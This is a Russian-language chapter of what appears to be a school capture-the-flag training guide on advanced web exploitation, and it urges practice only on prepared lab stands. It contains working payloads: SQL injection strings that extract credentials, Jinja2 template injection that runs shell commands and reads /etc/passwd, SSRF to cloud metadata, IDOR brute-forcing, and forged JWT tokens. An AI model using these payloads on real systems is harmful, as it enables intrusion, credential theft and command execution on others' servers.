# Глава 6 (hard). Web: эксплуатация уязвимостей

Продвинутые веб-атаки. На муниципале встречаются редко, на регионе - регулярно (🔺). Пробуй их на
**специально подготовленных стендах**, не на посторонних сайтах. Простой стенд с кукой и
SQL-инъекцией - `lab/stand.py`; инструменты (Burp, ffuf, sqlmap) - в [`burpsuite.md`](burpsuite.md) и
[`web-tools.md`](web-tools.md).

## 1. SQL-инъекции: извлечение данных через UNION

Если на medium мы обходили вход через `' OR '1'='1`, то здесь - **достаём данные из базы**.

```sql
' UNION SELECT 1,2,3 --            <- подобрать число столбцов (пока не исчезнет ошибка)
' UNION SELECT username,password,3 FROM users --     <- вытащить логины/пароли
' UNION SELECT table_name,2,3 FROM information_schema.tables --   <- имена таблиц
' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users' --
-- SQLite (частый случай на школьных CTF - в нём НЕТ information_schema):
' UNION SELECT sql,2,3 FROM sqlite_master --              <- все таблицы и их столбцы сразу
```

Порядок: (1) найти число столбцов через `ORDER BY 1,2,3...` или `UNION SELECT 1,2,...`; (2) понять,
какие столбцы выводятся на страницу; (3) подставить в них нужные поля из `information_schema`.

**Слепая (blind) SQLi** - когда вывода нет, но ответ меняется (да/нет или по времени):
```sql
' AND (SELECT substr(password,1,1) FROM users LIMIT 1)='a' --     <- посимвольный подбор
' AND SLEEP(5) --                                                 <- задержка = "истина" (time-based)
```
Это автоматизируют скриптом (см. п. 5) или `sqlmap` (если есть в образе).

## 2. SSTI - инъекция в шаблонизатор

Если ввод подставляется в серверный шаблон (Jinja2 и т.п.), проверка - ввести `{{7*7}}`. Если на
странице появилось `49` - это SSTI, и часто ведёт к выполнению кода:

```
{{7*7}}                                   <- тест: вернулось 49 -> уязвимо
{{config}}                                <- дамп конфигурации (Flask)
{{''.__class__.__mro__[1].__subclasses__()}}   <- длинный путь к выполнению команд (Jinja2)
```

💡 Короткие универсальные пейлоады Jinja2 - без перебора индексов подклассов, можно запомнить:
```
{{ cycler.__init__.__globals__.os.popen('cat flag*').read() }}
{{ lipsum.__globals__.os.popen('id').read() }}
```

## 3. LFI / Path Traversal -> чтение и RCE

```
?page=../../../../etc/passwd                      <- чтение файлов (LFI)
?page=php://filter/convert.base64-encode/resource=index.php   <- прочитать PHP-исходник в base64
```
🔺 LFI иногда превращают в выполнение кода через "отравление логов" или сессии - это уже регион.

## 4. SSRF - заставить сервер ходить за тебя

Если сервер сам запрашивает URL из параметра - направь его на внутренние адреса:

```
?url=http://127.0.0.1:8080/admin         <- доступ к внутреннему сервису
?url=http://169.254.169.254/             <- метаданные облака (классическая цель)
```

## 5. Автоматизация через Python requests

Браузер неудобен для перебора/скриптов - используй `requests` (есть в образе):

```python
import requests
s = requests.Session()                                   # хранит куки между запросами
r = s.post("http://сайт/login", data={"user":"admin","pass":"x"})
r = s.get("http://сайт/panel", cookies={"role":"admin"})
print(r.status_code, r.text[:200])
# перебор, например, числовых id (IDOR):
for i in range(1, 100):
    r = s.get(f"http://сайт/order?id={i}")
    if "flag" in r.text:
        print(i, r.text); break
```

## 6. JWT: подделка при слабом секрете

Если токен подписан `HS256` на слабом секрете - перебираешь секрет и подписываешь свой токен:

```bash
hashcat -m 16500 jwt.txt words.txt        # найти секрет
# затем собрать токен с admin:true и этим секретом
```

PyJWT на ВМ может не быть - подпись HS256 считается на встроенном `hmac` в несколько строк:
```python
import hmac, hashlib, base64, json
def b64u(d): return base64.urlsafe_b64encode(d).decode().rstrip("=")
header  = b64u(json.dumps({"alg":"HS256","typ":"JWT"}, separators=(",", ":")).encode())
payload = b64u(json.dumps({"admin": True},            separators=(",", ":")).encode())
msg = f"{header}.{payload}".encode()
sig = base64.urlsafe_b64encode(hmac.new(b"secret", msg, hashlib.sha256).digest()).decode().rstrip("=")
token = f"{header}.{payload}.{sig}"
```
(Про `alg:none` - см. medium; это более простой случай.)

## 7. Частые места, которые смотрят в последнюю очередь

- Заголовки ответа (`curl -I`) - иногда флаг в кастомном заголовке `X-Flag`.
- Разница ответов на разные методы: `curl -X PUT`, `OPTIONS`, `TRACE`.
- Параметры, которых "нет" в форме, но код их читает (подбери по смыслу: `debug=1`, `admin=1`).
- `/.git/`, `/.env`, `/backup.zip`, `/api/`, Swagger (`/api/docs`). ⚠️ `/.git/` часто отдаёт 403, но
  `curl http://site/.git/HEAD` качается - тогда весь репозиторий выкачивают `wget -r http://site/.git/` или `git-dumper`.

🎯 **Тренировка (hard).** Напиши на `requests` скрипт, который логинится (сохраняя сессию) и
перебирает `id=1..100` в поисках строки `flag`. Разверни локально любое уязвимое приложение
(например, учебное) и потренируйся на нём - не на чужих сайтах.

---
*Уровень: **hard**. Рядом: [easy](easy.md) | [medium](medium.md) | [оглавление](../00-about.md)*
